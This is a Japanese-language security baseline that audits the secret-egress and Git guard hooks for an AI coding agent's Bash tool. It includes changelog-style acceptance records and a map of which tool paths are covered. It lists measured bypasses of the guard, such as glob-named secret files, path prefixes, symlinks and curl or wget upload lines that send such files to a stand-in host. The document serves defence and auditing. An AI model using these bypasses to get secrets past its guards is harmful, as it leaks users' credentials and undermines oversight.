# Secret ガードの層と被覆 — 基準線

<!-- PR191:R42:LAYERS:BEGIN -->

## R42: 追加consumer・own検査・反証の境界

2026-10-18 07:35:30 JST snapshotは、当時の公開基点head `157c15ebddae485a05fba350dae82435a432eea6` に対する未commit candidateを対象とし、最後の全体取得07:15:05.546の209thread／未解決9（CR6＋Codex3）を保持し、後着修復後の最終sourceの全件・新head CI・fresh両reviewの受入は当時PENDINGである。

[R42の現在契約・通常費用・同目的の出口](git-command-guards.md#r42-current-contract)を参照する。Hook DATA、非実行query、固定sourceの全件実行・資格、公開CI／review、native成立を別の証拠として扱う。初回v1の8694 PASS／2 FAILを最終修復sourceの合格へ持ち越さない。

<!-- PR191:R42:LAYERS:END -->

<!-- PR191:R41:LAYERS:BEGIN -->

## R41: 追加reader consumerとmanager launcherの境界

commit前readerの`post-index-change` callbackと署名表示verifierは、pager/fsmonitor/textconvとは別の選択consumerとして確認する。`systemd-run`はserviceのmanager親とscopeのsystemd-run親・caller環境継承を分け、child抽出だけでcwd/env/sourceや展開条件が既知とはしない。[R41の影響表・正常対照・同目的の出口](git-command-guards.md#r41-current-contract)へ条件を集約する。

必要なhook／署名検証／service/scopeを省いて同等操作と扱わず、未検査sourceのUNKNOWNと確定policy違反のFORBIDDENを分ける。query・印字DATA・非選択consumerの普通の作業と、独立FORBIDDENの対照も必要である。

**公開前snapshot**: 2026-10-17 06:47:19.559 JSTのv2固定時点では、当時の公開基点head `2f8e3c62b285073b0714a6fd39325d6fa72938af` に対する未公開R41 candidateの部品・統合全件・新head CI・fresh reviewの最終受入をPENDINGとして記録した。06:49:50.108 JSTのv3は同じ公開基点でのdocs文言修正で、この当時の状態を保持した。

後続の公開head `157c15ebddae485a05fba350dae82435a432eea6` では、required CI run [38972258568](https://github.com/theosera/obsidian-ai-pipeline/actions/runs/38972258568) のjobが2026-10-17 06:53:02 JSTに成功完了した。2026-10-18 06:54:58.180 JST取得snapshotの当時head `157c15ebddae485a05fba350dae82435a432eea6` では、fresh CodeRabbit full review5560271970は06:53:01 JSTに正常完了して新6件が未解決で、fresh Codex fullは進行中のため、両fresh reviewの受入と指摘処理はPENDINGである。

R40固定headの成功と、以下の全履歴・原FAIL/NEを新R41の資格へ持ち越さない。

<!-- PR191:R41:LAYERS:END -->

<!-- PR191:R40:LAYERS:BEGIN -->

## R40: 先行readerのsource判定と、guard自身の検査を分ける

同一commandのcommit前にあるGit readerは、実効設定が選ぶpager・fsmonitor・diff driver/textconvの副作用を検査できなければ、secret-gitが既存の確定FORBIDDENの後でUNKNOWNにする。新gateはstandalone readerへ広げず、egress/add-all等の既存の独立判定も解除しない。[現在の条件・通常費用・同目的の出口](git-command-guards.md#r40-current-contract)に契約をまとめる。既定pagerが分からない普通のdiff/logもcommitと連結すると止まり得る。

guard自身のstaged/path読取は、信頼済みGit・対応版を確かめてhelperを抑止する検査である。提案された先行readerの実効設定観測とは別に扱い、helper設定を消してから安全と判定しない。設定値やhelper本文を公開する検査ではない。必要なhelperを外しても同じ意味とは決めつけず、同条件を保てる分割と後commitの再検査、またはowner確認を選ぶ。

真正queryでも実行先・設定source・診断出力の確認は必要で、bare `command -p git`の既定検索先や未知Git envを推測で通さない。新probe/version・SG自前読取・共通alias観測の診断抑止は、それぞれの内部検査に限定する。revision/object/attribute readerのindex能力も名前だけで否定せず、有効fsmonitor等で通常UNKNOWNになる費用を残す。

grepの実quietは既定pagerだけを非選択にし、消費DATA/`--no-quiet`を分け、明示pager・強制`-p`・trace・index等を維持する。不正context数値と未区切りdash pathはmode UNKNOWNであり、未到達pagerを拒否理由にしない。query/versionも固定consumerのsource・前段callback条件付きで、conditional sourceや未知設定を一律免除しない。

初回R40 sourceのNode契約試験776/776と別production shell parity15/15はlocal成功（2026-10-17 00:48:49 JSTまで）。776にはowned DUMMYで内部Git診断のactivation controlと抑止を検査する1件が含まれ、全件pure解析とは呼ばない。当時の全8655比較・通常cost・逆検証・新head CI/fresh review受入をPENDINGとし、原8586定義・期待と新69追加を分け、当該unit cutで進行中だったfullを合格へ先取りしなかった。R39の8586/737等と、以下のR38以前の数値/current表記は当時source/cutの履歴で、現在の合格へ持ち越さない。原FAIL/未到達も保持する。native/helper全般・任意設定・実入口を認証した意味にはしない。

後続の初回fullは2026-10-17 00:59:00.455 JSTに8655件完走し、元期待に対するcandidate48不一致／旧signature差51を確認した。new69全一致・broken0、差はownSG ALLOW→UNKNOWNのみでEG/AG分類差・危険側ALLOW拡大0だったが、このcutではqueryや消費DATAの過剰UNKNOWN候補も調査中だった。原oracleを変更せず、当時の全件受入PENDINGと48不一致を残す。単一edgeの停止因果を証明しても、この通常費用の受入や必要な別gateの成功は代用しない。

995d source full8687の原46不一致／49signature差も保持し、意味上の3問題があった未適用46台帳は棄却した。3b0112 sourceのunit786/parity15と全8695完走45不一致は別cutである。理由wireで見つけたNODASH正常対照の誤分類はC7で修復し、同入力のd0 ALLOW→3b UNKNOWN→C7 ALLOWを保持した。元compoundの既定pager UNKNOWNは別に残す。

現在のC7 sourceはNode契約787/787・別parity15/15、逆12profiles/36pairs/216Hook、45理由135Hook・不一致0の停止時履歴証拠を持つ。再開後、元8586の原定義・原期待の全記録と非oracle入力を保持して45件の理由付き期待を明示適用し、binding/改変検知の再資格とNode契約789/789・別parity15/15が成功した。全789をpure解析とは呼ばない。

旧8586＋new110＝8696の旧runは2832件中断で、新runへ加算しない。再開後の新runは2026-10-17 05:56:56.436 JSTに完走し、元期待のcandidate45不一致／exit1を保持、new110不一致0・broken0だった。宣言45件の期待を同じ51846Hook記録へ適用した05:57:00.566の明示再評価で8696/8696適合・failed0を確認した。追加の全件実行ではなく、元非oracle入力・runtime/source/fixtureは不変、旧SG FORBIDDEN127件も維持した。**05:57 JSTの公開前cutでは、新head CI・fresh両reviewと指摘処理をPENDINGとした**。公開2f8e3c62のCI run38966630535は成功し、両fresh fullも正常完了したが、新6件は未処理（06:43:48 JST取得）。未公開R41の新head CI・全件受入は別にPENDING。原48/46/45FAILを削除せず、local受入を公開側の完了へ読み替えない。

<!-- PR191:R40:LAYERS:END -->

<!-- PR191:R38:LAYERS:BEGIN -->

## R38: 私有契約・公開観測・native条件の別gate

この節は私有最終sourceのローカル受入cut（2026-10-16T10:57:01.166111+09:00 JST）。新公開head・同head CI・fresh両review・実入口は未取得のまま分ける。後続の公開結果はPR本文と監査台帳へ記録し、このcutの履歴へ遡及させない。

R38はDNS clientの選択値、Netcat別名とbackend、Wget client認証source、先行cd後のGit pathspecを有限に扱う。ALLOWは対応条件内で当該Hookが拒否しない結果、FORBIDDENは確認したpolicy違反、UNKNOWNは選択source・argv・contextが未検査の結果で、後二者は停止する。 対応する四責務と通常費用は[guideのR38契約](git-command-guards.md#r38-current-contract)に集約する。raw uploadとclient認証source、DNS選択値と無関係なreaderを分ける。未知sourceを単にscope外としてALLOWにせず、根拠が足りなければ有限にUNKNOWNで停止する。

R38の部品／私有合成を、公開修復受入・実settings入口・nativeの接続/認証/通信成立・PR全体Goalの証明にしない。ローカル受入は固定runtime sourceで直接入力8454/8454・broken0（25362 Hook呼出し）、role解析699/699と別のproduction shell parity15/15、通常root test602/602・typecheck・lint・package.json重複検査が成功。新公開head/requiredCI・両fresh review・必要な実入口L3は **PENDING**。旧cutの未完了や原FAILも消さない。

以下のR37以前の本文・数値・「current／現在」は、それぞれのsourceと取得日時に結合した履歴である。旧本文と順序を保持し、R38の新sourceでの測定結果へ読み替えない。

<!-- PR191:R38:LAYERS:END -->

<!-- PR191:R37:LAYERS:BEGIN -->
<a id="r37-layers-contract"></a>
## R37: 意味・判定・実入口・native条件を分ける（固定sourceのローカル受入cut）

基点はpublic7b。今回の部品はcommand-scope Git設定、flock/有限util-linux、queryを含む実program identity、curlの認証/engine、hyphen functionとordinary-unset、keyscan/Wgetの選択resolverを扱う。範囲と通常費用は[現在の有限契約](git-command-guards.md#r37-current-contract)を参照する。FORBIDDENは確認したpolicy違反、UNKNOWNはsource/argv/context不足、ALLOWはこのguardの停止要求がないことを表し、対応外を保護済みと記録しない。

| 層 | 記録する証拠 | 記録の限界 |
|---|---|---|
| L1意味/metadata | optionの値、選択programとargv0、設定・生成元・function map・resolver/authentication roleの意味 | parser成功やliteral値だけで実source/installedbackendの安全性を認証しない |
| L2直接Hook DATA | ownEG/SG/AGそれぞれのALLOW/FORBIDDEN/UNKNOWNとprefix、正常対照、元入力比較、単一新edgeの逆検証、source/owned安定 | aggregate denyにmaskedな担当不足や、必要性UNPROVEDを残す。別sourceの成功や新期待の訂正を元PASSへ書き換えない |
| L3実settings入口 | exact DUMMY/stub試行、PreToolUse start/finish/判定、normal marker、副作用と実入口の未行使 | Hook前API/safeguard停止はNOT_EXERCISED。direct Hookや旧CLIの観測を現在dispatchへcarryしない |
| native成立条件（上記と別） | 実版/backend・PAM/engine/設定/権限、DNS/TLS/認証/transport等 | 今回の有限DATA試験から成功/実秘密露出/被害を主張しない。局所修復後も未検証表示を保持 |

固定sourceのL1/parity/追加契約673/673、直接入力8204/8204・broken0・実Hook24612回が合格。旧7824のinput/順序/全oracle変更0、追加380unique・alias16の追加assertを確認した。逆検証は同じ合成sourceの100 Hook機能・455比較pair・2670実Hook呼出しを資格化し、別shell1機能は15pair/30test観測（Hook0）として保持した。必要性UNPROVED3機能と元逆期待FAIL5profileを保持し、UNKNOWNの独立maskや追加precisionを成功へ書き換えていない。publichead/requiredCI、fresh両review/thread、必要L3は公開後の別取得として **PENDING**。旧7824のinput/順序/oracle変更0を受入条件とし、過去R6P38の変更履歴や旧FAILを消さない。ordinary unsetは既存認識済みmapのpotential removalだけをtyped opaqueへし、後続選択をUNKNOWNとする有限部品で、variable-only/無関係/未使用等を正常対照にする。閉鎖済み部品も統合sourceへの再結合が必要で、任意function lifecycleを新たに認証しない。

普通の未検査設定・hostlist/認証source・必要なwrapper/functionのcallでもUNKNOWNとなる費用がある。同じ対象/operation/版/backend/cwd/env/config/sourceを保つ対応形がなければownerへ不明点を示す。selector削除やHook停止を自動代替にしない。

**以下はR36以前および2026-09時点の旧cutである。「現在/current」等も当時のsourceに結合し、旧層の空白・旧迂回・旧数値をR37で再確認した結果とはしない。原文と測定者/リポ/日時を保持する。**


固定ローカルcut（UTC）: 2026-10-15T22:34:05.996284+00:00。公開source inventoryは旧17＋追加本番契約test2＝19を別途同headへ結合する。旧7824との集計比較は別fixtureであり、同一実tupleの因果比較と混同しない。
<!-- PR191:R37:LAYERS:END -->

<!-- PR191:R36:LAYERS:BEGIN -->
<a id="r36-LAYERS-contract"></a>
**R36 guard契約（固定sourceのローカル受入済み・公開前cut）**: util-linux 2.39.3のchrt/nsenter/tasksetはoption値・実query・PID0/child・contextを分けます。既知の通常child／有限scalar値は維持し、未対応context・implicit shell・未確定境界はUNKNOWN。R6P38の未確定taskset mask＋通常catは、元入力と元ALLOWを保存した理由付き **ALLOW→UNKNOWN 1件**です。必要なselectorを削除して目的を変えることを自動代替にしません。

OpenSSL 3.5.0／LibreSSL 4.0.0は選択configをquery/local modeより前に確認し、default configが未検査なら通常version/help/dgstもUNKNOWNになり得ます。既知empty configは必要provider/configを失わず同じ目的を保つ場合に限る対照です。通常argv0・実global queryとdelegated help、認証source、stdin、early-dataを分け、既知file-backed early-dataは通常名でも既存upload policyでFORBIDDENです。git amの実 `-n`／`-qn` はown add-allがFORBIDDEN、消費DATA／他commandの`-n`は同じ意味にせず、独立egressのUNKNOWNは残ります。

filenameのtemplate例外は**final basenameの `.env.example` だけ**です。`secrets/.env.example` や `.env.local/.env.example` のancestor保護は残り、root／通常directoryのtemplateを正常対照にします。file内容やuploadの許可を認証する例外ではありません。判定はALLOW／FORBIDDEN／UNKNOWN、停止理由と不足条件を分け、同じ対象・操作・条件を保つ対応形式がなければownerへ確認します。

[版・正常対照・owner出口・受入gate](git-command-guards.md#r36-current-contract)。文書cut **2026-10-16T05:34:54.883582+09:00**、固定manifest `98224bf12725…` / AG `5b5cce55a0d5…`。L1は**601/601（解析586＋parity15）**、current単一edge逆検証は**59機能（Hook58＋shell1）/239pairs/1374actual Hook入力**で閉鎖。curl UNPROVED2featuresと、別の3 masked profilesは区別して残します。**全7824/7824を新規実行してPASS**、failed0/broken0・23472Hook入力（2026-10-16T05:28:47.371000+09:00終了）で、旧7827からのprojectionではありません。旧7827 FAILED4、元cross08/09/10の不一致、正常query R23GA10とmasked R23GA11の同原因TypeError／1文字修復を保存しました。

旧7459入力/順序とR23GA10の元ALLOWを保持し、R6P38の理由付きA→U ledger1を分けます。旧R35以下はsource/日時付き履歴で、旧成功数を現在へ持ち越しません。**新headCI・fresh両review/thread・必要L3はこの公開前cutでPENDING**です。[PR #191本文](https://github.com/theosera/obsidian-ai-pipeline/pull/191)と同headの監査receiptで公開後の状態を更新し、この日時付きcutを将来状態へ読み替えません。全Bash egress／conditional secret-git・add-allを維持し、direct Hook DATAと実dispatchを区別します。実native/通信・Goal/ZIP完成・mergeを主張しません。
<!-- PR191:R36:LAYERS:END -->

> **2026-10-13 更新（PR #191 の branch）**: 以下は 2026-09-03〜09-04 に取得した層別測定を保持した記録である。本リポの cjs hook は、その後 shell 解析と局所的な fail-closed を追加した。現在の許可形式、Git / upload の制限、hook の入口は [Git ガード](git-command-guards.md)を参照する。以下の迂回・数値を、変更後の cjs 版の再測定結果として扱わない。py 版や他リポの測定も、本 PR の結果に読み替えない。
>
> **目的**: 週次 LLM 脅威レポートを仕分けるための**基準線**。新手法を署名で追うのではなく、
> **「その手法は在る層に当たるのか、層が無い場所を通るのか」**で判定するために置く。
> 基準線が文書化されていないと、毎週ゼロから測り直しになる。
>
> **基準線の as-of 2026-09-04**。⛔ **個別の測定値は行ごとの as-of が優先する**
> — 本書は 09-03 と 09-04 の測定を併載している (例: §6 の器具表は 09-04)。
> 測定値には**測定者とリポ名**を必ず添える (他者の測定を自分の実測として運ばない)。
> 残課題としての起票は `docs/security/handover-residual-tasks.md` #18–#21。

> ⚠️ **本書が秘密ファイル名を逐語で引用していないのは意図的**である。egress guard 自身が
> 「パターンについて**書く**こと」と「**使う**こと」を区別できず、逐語で書くと本書の作成・編集
> そのものが拒否される (§7 の残差 2–3)。具体的な綴りは各リポの hook 本体とテストにあり、
> 情報は失われていない。

## 1. 経路ごとの被覆

| 経路 | 被覆 | 実測 | 測定者 |
|---|---|---|---|
| Bash | egress guard (**名前照合**。py 版は default-deny へ反転済み) | ユーザ層 `~/.claude/settings.json` の PreToolUse は `matcher: "Bash"` のみ / hook 2 本 (破壊的 rm・secret egress) | 0a / 2e |
| Bash (本リポ内) | 上記 + リポ層 hook 3 本 | `.claude/settings.json` の PreToolUse も `matcher: "Bash"` のみ。`block-secret-git.cjs` / `block-git-add-all.cjs` / `block-secret-egress.cjs` | 2e 実測 |
| Read / Write / Edit ツール | **hook 対象外**。`permissions.deny` のみ。リポ単位で散在 | §2 | 0a / 62 / 2e |
| MCP / 孫プロセス | **未被覆・未測定** | — | — |

⇒ ⛔ hook は **PreToolUse(Bash) にしか登録されていない**。Read / Write / Edit ツール、MCP、
Bash から起動された孫プロセスは、この層を一切通らない。

## 2. `permissions.deny` の分布 (リポ単位)

| 層 / リポ | deny 総数 | うち Read 系 | 秘密ファイル名の Read deny | 測定者 |
|---|---|---|---|---|
| ユーザ層 `~/.claude/settings.json` | 21 | 4 | **0** (SSH / AWS 資格情報 / AWS config / GnuPG のみ) | 0a 実測 |
| pipeline-youtube-SDK | **0** | 0 | 0 | 0a / 62 が独立に実測 |
| claude_openai_mcp_connector | 47 | 18 | 有り | 62 実測 / 0a・2e 未検証 |
| obsidian-ai-pipeline | 43 | 19 | 有り | 2e 実測 / 0a 未検証 |

⚠️ connector の 47/18 と obsidian-ai-pipeline の 43/19 は**別リポの数値**であり食い違いではない。
引用するときは必ずリポ名と時点を添えること。

⇒ ⛔ **設定の無いリポでは層が消える。** 2026-09-03 時点の pipeline-youtube-SDK がそれ。

## 3. 2026-09-04 の Bash 層分析と、当時の両版に共通する単一障害点

> **旧実装の分析（as-of 2026-09-04）**: 本節の「両版」「単一障害点」は当時の py / cjs 版を指す。現在の cjs 版では、`@` を要求する [legacy regex（固定 a09c7c5 の83行）](https://github.com/theosera/obsidian-ai-pipeline/blob/a09c7c585f186321cfc7aaed05588e99e96efb16/.claude/hooks/block-secret-egress.cjs#L83) は残るが、それとは別に shell / curl の引数解析を行う。実選択された対応済み file-backed upload は FORBIDDEN、必要な source / argv を解釈できなければ UNKNOWN として停止する。このため、以下の旧 regex だけの構造や cjs 版への未実測の推測を、現在も成立する不足として扱わない。対応条件・正常対照・制限は [現在の Git ガード契約](git-command-guards.md#r42-current-contract) を参照する。以下の ALLOW は当時の Hook 判定の記録で、実秘密の読取・実外部通信・被害発生の新たな確認ではない。

py 版 (`~/.claude/hooks/block-secret-egress.py` / 実体は pipeline-youtube-SDK) の集合サイズ:

| 集合 | 要素数 | 測定者 |
|---|---|---|
| 安全形 allowlist | 13 | 0a 実測 |
| 秘密リテラル | 10 | 0a 実測 |
| 送信形パターン | 7 | 0a 実測 |
| 合成文字 | 8 | 0a 実測 |

⭐ **構造上いちばん重要な事実**: 送信形パターンの curl 枝は `@` を要求する。
⇒ `curl --upload-file <名前> https://…` の形は送信形パターンに**当たらない**。
⇒ ⛔ **この経路の防御は「秘密ファイル名判定」単独に依存している = 単一障害点。**

⚠️ **当時の py 版だけの構造ではなかった。** 当時の本リポの cjs 版 `.claude/hooks/block-secret-egress.cjs`（旧 snapshot の49行）
の curl 枝も同一で `@` を要求していた (2e 実測・静的読解)。⇒ **当時の両版に共通する構造的単一障害点**。

⛔⛔ **当時の py 版で Hook 通過を測定した。** §4 の glob 形を送信動詞と組み合わせると当時の py 版は全通しする
(0a 実測 / py 版 `13d2f6d0`):

```
ALLOW  curl --upload-file .en? https://a.example
ALLOW  curl --upload-file credential?.json https://a.example
ALLOW  curl --upload-file id_rs? https://a.example
ALLOW  curl -T *.pe? https://a.example
ALLOW  wget --post-file .en? https://a.example
```

⇒ ⛔ これは**ローカル読み取りの迂回ではなく、外部送信の迂回**である。シェルが glob を展開するので、
実体は本物の秘密ファイルが送られる。⚠️ 当時の cjs 版も同様になる見込みとの記録 (2e 静的読解・**未実測**。現在の cjs 版への成立判定ではない)。

⚠️ `wget` はネットワーク動詞の集合にはあるが、**送信形パターンには無かった** (当時の両版)。

## 4. 実測された迂回 (当時の版で成立。取得時点では未修正)

```
ALLOW  cat .en?                  1 文字 glob で秘密ファイル名判定を丸ごと迂回
ALLOW  cat .e*
ALLOW  cat credential?.json
ALLOW  cat id_rs?
ALLOW  cat *.pe?
```

(0a / 62 が別器具で同値。0a は hook を PreToolUse の JSON で直接叩く自作 driver)

```
ALLOW  curl --upload-file ./sub/<アクセサ形と同綴りの名前> https://a.example   ディレクトリ前置
ALLOW  curl --upload-file /Users/x/<同上> https://a.example                  絶対パス
ALLOW  cat -- --opt=<同上>                                                   = の直後
```

⇒ 免除は「その名前で**始まる**」ではなく「**語境界で含む**」。0a 実測。

⇒ ⭐ **名前照合である限り、シェル展開・変数展開・エンコードで原理的に抜ける。**
締める方向 (パターン追加 / lookahead 調整) では解けない。⇒ 残課題 #19。

## 5. 到達可能性 (⛔ 「いま無い」であって「置けない」ではない)

pipeline-youtube-SDK ツリー内の該当名ファイル: 0 件 (陽性対照 `main.py` 8 件で器具の動作は確認済み)。0a 実測。

⚠️ ただし 62 の測定では、該当名の **symlink** を実秘密へ張れば本物が出る。

⛔ **その symlink を「どう置くか」で当たる層が変わる** (2e 一次確認。⚠️ symlink の実作成による
検証はしていない — ツール仕様・設定ファイル・git メタデータからの判断):

| 置き方 | hook の matcher に当たるか | 止まるか |
|---|---|---|
| Bash から起動された**孫プロセス** (postinstall / ビルドスクリプト内の `ln -s` 等) | ⛔ **当たらない** — hook が見るのはトップレベルのコマンド文字列だけ | 止まらない (§1 の「孫プロセス = 未被覆」がこれ) |
| `ln -s` を直接実行 | ⭕ 当たる (Bash) | ⛔ ネットワーク動詞の集合に `ln` が無く素通り (静的読解・**未実測**) |
| コミット済み symlink を `git clone` / `checkout` で展開 | ⭕ 当たる (Bash) | ⛔ `git clone <url>` は秘密ファイル名にも送信形にも当たらず素通り (本リポの committed symlink は現在 0 件) |
| Write / Edit ツール | — | ⛔ **そもそも symlink を作成できない** (どちらも入力にエントリ種別・リンク先の指定が無い) |

⇒ ⭐ **hook を「通らない」のは孫プロセス経路だけ**で、残りは「**通るが止まらない**」。
⛔ この区別を潰すと、**層の空白 (§1) と層の穴 (§4・§7) が混ざる** — 前者は層を足す話、
後者は既存の層を直す話で、打ち手が違う。

⇒ ⛔ **攻撃者がファイル名を持ち込める前提が成り立つ環境では、この 0 件は保証にならない。**
グローバル層は「clone した外部リポは untrusted」を明示の運用として持つ (`untrusted-repo-intake` skill)
ため、clone 先にファイルを置くのは攻撃者に無料である。

## 6. 器具と期待値 (⛔ この節ごと運ぶこと)

| 器具 | 同一性 | 期待値 | 被覆の限界 |
|---|---|---|---|
| `~/Downloads/verify-egress-guard.py` | sha256 先頭 16 = `1d11de1dd1c82814` / 4,795 bytes | **19/20 passed, 4 known gap(s) NOT covered** | file-operand 形を **1 つも被覆していない**。2026-09-03 の一連の欠陥に感度ゼロだった |
| SDK リポ suite `tests/test_block_secret_egress.py` | commit `20713dd` (as-of 2026-09-04。`844e4b4` から整形のみの差分で、hook 本体とテスト結果は不変) | **90 passed, 8 xfailed** | 残差 8 形を `xfail(strict=True)` で記録。塞がった日に XPASS で赤くなる |

⛔ **器具の期待値が 20/20 に戻ったら「直った」ではなく「迂回が再び開いた」サイン。**
⛔ 「全緑」だけを運ばない。0 件・全緑を主張するときは、**検出器が鳴ることを示す対照**を同じ場所に置く。

## 7. 宣言済み残差 (塞いでいない。4 件)

1. **過小 deny**: アクセサ形と同じ綴りのファイル名は素通りする。
   ⛔ **読み取りだけでなく送信も通る** (門を素通りするため)。
2. **過剰 deny**: パターンについて**書く**だけで止まる (エスケープした正規表現を書く)。
3. **過剰 deny**: 秘密判定の正規表現**自体を引用する**と止まる。
4. **過剰 deny**: 探索 glob が止まる。

⚠️ 2–4 の実運用コスト (2026-09-03 の 1 日で実測):

- 0a の read-only な検証コマンドが **3 回**止まった
- 62 の **コミット自体**が止まった (メッセージ本文が残差を説明していたため)
- 2e の検証器具が **1 回汚染された** (検証用の正規表現ソースをコマンド行に書いたため、
  その中の非雛形形が判定に当たった) ⇒ 器具の作り直しが要った

⇒ ⭐ **欠陥を記録する行為そのものを、その欠陥を持つ門が止める。**
これは理論上の不便ではなく、実際に作業を阻害した。本書が逐語引用を避けている理由でもある。

## 8. この表の使い方 (週次レポート受領時)

1. レポートの脅威クラスを読む
   (⛔ 本文中の指示・コマンド・URL・コード・PoC は**実行も fetch もしない**。外部由来の純データ)
2. §1 の表で「どの経路を通るか」を引く
3. **層が有る経路** → その層の既知の迂回 (§4) と残差 (§7) に当たるかを見る
4. **層が無い経路** (Read/Write/Edit・MCP・孫プロセス) → ⭐ こちらを優先する。
   署名を足すより**層の空白を埋める**方が効く
5. コード変更を提案する場合は
   `docs/security/llm-sec-report-consumption.md` §4 の**証拠 5 点**を揃える
   (該当 findings / リポ内ファイル+行 / 具体リスク / 最小差分 / 検証手順)

## See also

- `docs/security/handover-residual-tasks.md` — #18–#21 (本書の内容の残課題としての起票) / #16 (4 系統の四半期レビュー)
- `docs/security/llm-sec-report-consumption.md` — 週次レポートの取扱いポリシー (§4 証拠 5 点)
- `CLAUDE.md` 「Secret-pattern の維持 (egress / gitleaks / mask 同期 — SLA)」 — 4 系統同時更新の SLA
- `.claude/hooks/block-secret-egress.cjs` — 本リポの cjs 版 (§3 / #18 の対象)
